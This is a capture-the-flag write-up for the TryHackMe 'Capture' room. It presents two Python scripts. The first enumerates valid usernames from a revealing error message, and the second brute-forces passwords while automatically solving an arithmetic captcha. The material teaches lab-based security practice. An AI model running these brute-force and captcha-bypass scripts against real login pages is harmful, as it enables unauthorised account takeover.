# Capture(TryHackMe)

Link to TryHackMe Room [https://tryhackme.com/room/capture](https://tryhackme.com/room/capture)

<img src="https://user-images.githubusercontent.com/25124463/236878216-64d5ac34-8a10-4814-9621-64c2c4af9306.png" width="600">




In this CTF room from TryHackMe I will be attempting to bypass a login form.&#x20;



### Enumeration&#x20;

After starting the machine and navigating to the login page this is what we are presented with. 

<img src="https://user-images.githubusercontent.com/25124463/236878987-fe6d22dd-2c2a-4113-ac5f-cd7bc0543316.png" width="600">


When entering the username ``admin`` and password ``admin`` as a test I see that I get an output at the bottom of the page saying:

**Error: The user 'admin' does not exist**

This means that we can brute force the login to find the username and observe for when the response does not contain the above error message indicating that username exists. 
We could do this on Burp Suite using the included username wordlist but the site has captcha in place after too many unsucessful login attempts.

<details>
<summary>Captcha</summary>

![captcha](https://user-images.githubusercontent.com/25124463/236881474-84571341-c715-4e2f-a9ab-dea7cb25b17c.png)
</details>

Since we now have to solve each captcha we must create a script to do this. I decided to use python to make my script. 

The username hacking script must do the following:
* Read each line of the ``usernames.txt`` file 
* Send the request with the login url and username/password payload. The password at this point is not important so we can give it a dummy value. Main goal is to find a valid username. 
* When captcha is found in the response we must solve it and include it in the request payload. 
* Loop through usernames and halt the script when a response returns html code that doesn't include ``Error: The user 'admin' does not exist``. 

My solution might not be the most elegant but it works to find the username lol
<details>
<summary>Code</summary>

```

import requests
import re

url = '' # replace with the URL of the login page

with open('usernames.txt', 'r') as uf:
    for username in uf:
        username = username.strip()
        
        payload = {
            "username" : username,
            "password" : "test_password"
        }

        response = requests.post(url, data=payload)

        if  "Invalid password for user"in response.text:
            print(f"Correct username: {username}")
            exit()
        else:
            # Solve CAPTCHA if present and send login request
            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
            captcha_text = ''
            if captcha_match is not None:
                captcha_text = captcha_match.group(0).replace('=', '').strip()
                print("CAPTCHA text:", captcha_text)

                # Solve the CAPTCHA and include the solution in the payload
                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
                if match:
                    num1, operator, num2 = match.groups()
                    solution = eval(num1 + operator + num2)
                    print("Solution:", solution)
                    print(username)
                    payload['captcha'] = solution
                else:
                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
                    continue
            
            # Send login request
            response = requests.post(url, data=payload)

            if "Invalid password for user" in response.text:
                print(f"Valid username: {username}")
                exit()



```
</details>

This will take about two minutes to finish. Correct username will be printed to the console. 

Next we have to take the correct username and create another script where we brute force to find the correct password.
In this script we must:
* Load the passwords from the password.txt file provided in the room. 
* Loop through all the passwords sending the username, password and captcha in the request payload. 
* if response returns the string "Too many bad login attempts" in the response text we know the password is unsuccessful so we can continue
* When the repsone text does not contain too many bad login attempts as a string we know that weve found the correct password 
* Print correct password and username to console and exit program. 

<details>
<summary>Code</summary>

```
import requests
import re

url = '' # replace with the URL of the login page

with open('passwords.txt', 'r') as pf:
        for password in pf:
            username = "" # The password you obtained from username script
            password = password.strip()
            
            payload = {
                "username" : username,
                "password" : password
            }


            response = requests.post(url, data=payload)
            
            # Send the GET request and extract the CAPTCHA string if present
            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
            print(captcha_match)
            captcha_text = ''
            if captcha_match is not None:
                captcha_text = captcha_match.group(0).replace('=', '').strip()
                print("CAPTCHA text:", captcha_text)

                # Solve the CAPTCHA and include the solution in the payload
                # num1, operator, num2 = re.findall('\d+|\D+', captcha_text)
                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
                if match:
                    num1, operator, num2 = match.groups()
                    solution = eval(num1 + operator + num2)
                    print("Solution:", solution)
                    payload = {
                        'username': username,
                        'password': password,
                        'captcha': solution
                    }
                else:
                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
                    payload = None
            else:
                print("No CAPTCHA found on the page")
                payload = {
                    'username': username,
                    'password': password
                }

            # Send the POST request with the payload if it is not None
            if payload is not None:
                response = requests.post(url, data=payload)
                if "Too many bad login attempts!" in response.text:
                    print(f"Attempted login with username as: {username} and password as: {password}")
                else:
                    print(f"The correct username is: {username} and password is: {password}")
                    exit()
            else:
                print("Empty payload, cannot send request")

```
</details>
At this point we can go to the browser using the username and password to obtain the flag to complete the room. Hope this helps someone. Happy hacking






![capture-completed](https://user-images.githubusercontent.com/25124463/236889555-c44067f1-4066-4135-8c5f-71bb841fa410.png)


**DISCLAIMER**
As an ethical hacker, I must emphasize that the following writeup is intended for educational purposes only. My goal as a "white hat" hacker is to identify and expose vulnerabilities in computer systems and networks in order to improve security. It's important to note that unauthorized hacking or accessing of systems without permission is illegal and can result in severe legal consequences. I strongly advise against using the information provided in this writeup for any illegal or unethical purposes. As the author and publisher of this content, I do not condone any illegal activities and I am not responsible for any actions taken by readers. It is your responsibility as a reader to use this information ethically and legally. Let's use our technical skills to make the digital world a safer place.




